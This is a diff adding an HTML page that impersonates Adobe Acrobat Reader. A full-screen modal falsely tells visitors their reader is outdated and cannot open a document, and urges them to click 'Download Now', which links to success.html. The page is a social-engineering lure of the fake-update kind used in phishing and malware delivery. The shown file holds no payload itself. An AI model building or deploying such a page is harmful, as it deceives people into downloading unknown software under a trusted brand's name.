@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-box {
+      background-color: #f0f0f0;
+      border: 2px solid #ccc;
+      border-radius: 6px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      width: 340px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .modal-box img {
+      width: 50px;
+      margin-bottom: 15px;
+    }
+
+    .modal-box h3 {
+      margin: 0;
+      color: #333;
+    }
+
+    .modal-box p {
+      color: #444;
+      font-size: 14px;
+      margin: 15px 0;
+    }
+
+    .modal-box a {
+      padding: 10px 20px;
+      text-decoration: none;
+      display: block;
+      background-color: #574bca; /* Adobe Red */
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .modal-box a:hover {
+      background-color: #2b2277;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="modal">
+    <div class="modal-box">
+      <img src="img/Icon_pdf_file.png" alt="Adobe Logo">
+     
+      <p>Your Acrobat Reader is outdated and cannot open this document. Please update to continue.</p>
+      <a href="success.html">Download Now</a>
+    </div>
+  </div>
+
+</body>
+</html>
